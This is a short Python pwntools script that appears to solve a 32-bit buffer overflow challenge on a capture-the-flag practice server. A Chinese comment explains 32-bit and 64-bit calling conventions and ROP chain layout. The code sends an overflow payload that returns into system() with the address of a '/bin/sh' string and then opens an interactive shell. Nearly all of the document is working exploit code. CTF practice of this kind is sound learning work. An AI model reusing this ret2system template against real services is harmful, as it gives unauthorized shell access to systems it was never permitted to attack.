from pwn import *

'''
本程序是32程序，gcc编译的32位程序，遵循这样的函数调用准则：
调用方将实参保存到栈中
被调方使用栈顶偏移量的方式访问保存到栈中的变量
程序刚刚进入函数时候，也就是将要执行该函数的第一条指令时，栈顶保存的是执行完该被调函数后的返回地址，栈顶的下面（我们规定上面是低地址，下面是高地址）依次保存着该调用函数用到的形参，注意分别对应着从右到左的参数

32位的ROP是system函数在前，bin/sh函数在后，两函数中填入一个将来的返回地址，一般直接填0

64位的ROP是bin/sh函数在前，system函数在后，两函数之前需要加上该文件的pop rdi地址（用ROPgadget实现）
'''

r = remote('node5.buuoj.cn', 28300)

system_addr = 0x08048320
bash_addr = 0x0804A024

payload = b'A' * 136 + b'B' * 4 + p32(system_addr) + p32(0) + p32(bash_addr)

r.sendline(payload)

r.interactive()
